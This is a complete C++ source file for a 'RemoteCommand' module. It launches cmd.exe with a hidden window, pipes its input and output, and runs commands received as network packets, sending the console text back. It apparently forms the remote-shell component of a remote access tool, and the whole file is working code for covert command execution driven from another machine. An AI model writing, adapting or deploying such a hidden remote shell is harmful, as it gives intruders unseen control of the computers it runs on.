#include	"cmd.h"

RemoteCommand::RemoteCommand(Connection* mConnObj)
{
	ConnObj = mConnObj;
}

RemoteCommand::~RemoteCommand() {}

bool RemoteCommand::CreateCmdProcess()
{
	STARTUPINFO sti = { 0 };
    SECURITY_ATTRIBUTES sats = { 0 };

	pipin_w = NULL;
	pipin_r = NULL;
	pipout_w = NULL;
	pipout_r = NULL;
	ZeroMemory(&pi, sizeof(pi));

	if (bRunning)
		KillCurrentCmdProcess();

	bRunning = false;

	//set SECURITY_ATTRIBUTES struct fields
    sats.nLength = sizeof(sats);
    sats.bInheritHandle = TRUE;
    sats.lpSecurityDescriptor = NULL;

	//create child's stdout pipes
    if(!CreatePipe(&pipout_r, &pipout_w, &sats, 0)) return false;
    //and its stdin pipes
    if(!CreatePipe(&pipin_r, &pipin_w, &sats, 0)) return false;
        
    //now set STARTUPINFO struct fields (from the child's point of view)
    sti.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; 
    sti.wShowWindow = SW_HIDE;
    sti.hStdInput = pipin_r;
    sti.hStdOutput = pipout_w;
    sti.hStdError = pipout_w;
         
    //create the process...
    if(!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA)&sti, &pi)) return false;
	bRunning = true;
	Sleep(100);
	return true;
}

bool RemoteCommand::isCmdStillRunning()
{
	DWORD excode;
	if (!bRunning)
		return false;
	GetExitCodeProcess(pi.hProcess, &excode);
	if(excode != STILL_ACTIVE)
		bRunning = false;
	return bRunning;
}

bool RemoteCommand::readCmd(char* bufferReceivedData)
{
	DWORD read, available;
	bool	ret;

	ret = false;
	if (!bRunning)
		return false;

	//now check to see if process has anything to say
    if(!PeekNamedPipe(pipout_r, bufferReceivedData, MAX_CMD_BUFFER, &read, &available, NULL)) 
		return false;
         
    //is there anything to be read in the pipe?
    if(read)
    {
		do
		{
            ZeroMemory(bufferReceivedData, MAX_CMD_BUFFER);
            //read it and print to stdout
            if(!ReadFile(pipout_r, bufferReceivedData, MAX_CMD_BUFFER - 1, &read, NULL) || !read)
				ret = true;
			
			bufferReceivedData[read] = 0;
            if(ret)
				break;
        }
        while(read >= MAX_CMD_BUFFER);
    }
	else
		return false;

	return true;
}

bool RemoteCommand::enterCmd(char* command)
{
	DWORD writ;
    if(!WriteFile(pipin_w, command, strlen(command), &writ, NULL) || !bRunning)
		return false;
	else
	{
		Sleep(100);
		return true;
	}
}

bool RemoteCommand::KillCurrentCmdProcess()
{
	if (bRunning)
		TerminateProcess(pi.hProcess, 0);
	bRunning = false;
	return true;
}

void RemoteCommand::OnInit()
{
	objID = 1;
	bRunning = false;
}

void RemoteCommand::OnPacketArrived(BYTE* PacketData, size_t Size)
{

	switch(PacketData[0])
	{
		case CMD_START:
			//offset	Desc
			//0			Command ID
			//1			Create Process result
			BYTE SendBack_Start[2];
			SendBack_Start[0] = CMD_START;
			if (CreateCmdProcess())
				SendBack_Start[1] = 1;
			else
				SendBack_Start[1] = 0;
			SendPacket(SendBack_Start, 2);
			break;

		case CMD_COMMAND:
			{
				//offset	Desc
				//0			Command ID
				//1			Command result
				BYTE SendBack_Command;
				enterCmd((char*)PacketData+1);
				SendBack_Command = CMD_COMMAND;
				SendPacket(&SendBack_Command, 1);
				break;
			}
		case CMD_EXIT:
			{
				//offset	Desc
				//0			Command ID
				BYTE SendBack_Exit = CMD_EXIT;
				KillCurrentCmdProcess();
				SendPacket(&SendBack_Exit, 1);
				break;
			}
		case CMD_GETTEXT:
			{
				char* consoleData;
				consoleData = (char*)malloc(MAX_CMD_BUFFER);
				if (readCmd(consoleData))
				{
					BYTE* SendBack_GetText;
					SendBack_GetText = (BYTE*)malloc(MAX_CMD_BUFFER + 1);
					SendBack_GetText[0] = CMD_GETTEXT;
					strcpy((char*)&SendBack_GetText[1], consoleData);
					SendPacket(SendBack_GetText, strlen(consoleData) + 1);
					free(SendBack_GetText);
				}
				else
				{
					BYTE SendBack_GetText[2];
					SendBack_GetText[0] = CMD_GETTEXT;
					SendBack_GetText[1] = 0;
					SendPacket(SendBack_GetText, 2);
				}
				free(consoleData);
				break;
			}
	}
	return;
}

void RemoteCommand::OnExit()
{
	KillCurrentCmdProcess();
}

